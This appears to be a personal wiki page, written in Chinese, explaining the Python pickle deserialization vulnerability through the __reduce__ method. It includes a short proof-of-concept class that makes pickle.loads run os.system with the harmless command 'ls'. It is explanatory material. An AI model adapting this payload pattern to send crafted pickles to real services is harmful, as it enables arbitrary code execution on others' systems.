<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>Pickle - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#Python">Python</a>&nbsp;»&nbsp;Pickle</div>
</div>
<div class="clearfix"></div>
<div id="title">Pickle</div>
  <div id="content">
  <h2 id="pickle">pickle 序列化漏洞</h2>
<ul>
<li>__reduce__(self)</li>
</ul>
<p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 __reduce__ 被定义之后，当对象被Pickle时就会被调用。</p>
<p>它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，</p>
<p>要么返回一个元组。这个元组包含2到5个元素，其中包括：<strong>一个可调用的对象，用于重建对象时调用</strong>；<strong>一个参数元素，供那个可调用对象使用</strong>；</p>
<p>被传递给 <strong>setstate</strong> 的状态（可选）；</p>
<p>一个产生被pickle的列表元素的迭代器（可选）；</p>
<p>一个产生被pickle的字典元素的迭代器（可选）</p>
<div class="hlcode"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">pickle</span>

<span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;ls&#39;</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,))</span>

<span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exp</span><span class="p">())</span>
<span class="o">&gt;</span>  <span class="s2">&quot;cposix</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">(S&#39;ls&#39;</span><span class="se">\n</span><span class="s2">p1</span><span class="se">\n</span><span class="s2">tp2</span><span class="se">\n</span><span class="s2">Rp3</span><span class="se">\n</span><span class="s2">.&quot;</span>

<span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">((</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">,)))</span>
<span class="o">&gt;</span> <span class="s2">&quot;(cposix</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">(S&#39;ls&#39;</span><span class="se">\n</span><span class="s2">p1</span><span class="se">\n</span><span class="s2">tp2</span><span class="se">\n</span><span class="s2">tp3</span><span class="se">\n</span><span class="s2">.&quot;</span>

<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exp</span><span class="p">()))</span>
<span class="c1"># it will do os.system(cmd)</span>
<span class="o">&gt;</span> <span class="n">read</span><span class="o">.</span><span class="n">txt</span>

<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">((</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">,))))</span>
<span class="o">&gt;</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">function</span> <span class="n">posix</span><span class="o">.</span><span class="n">system</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">,))</span>
</pre></div>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>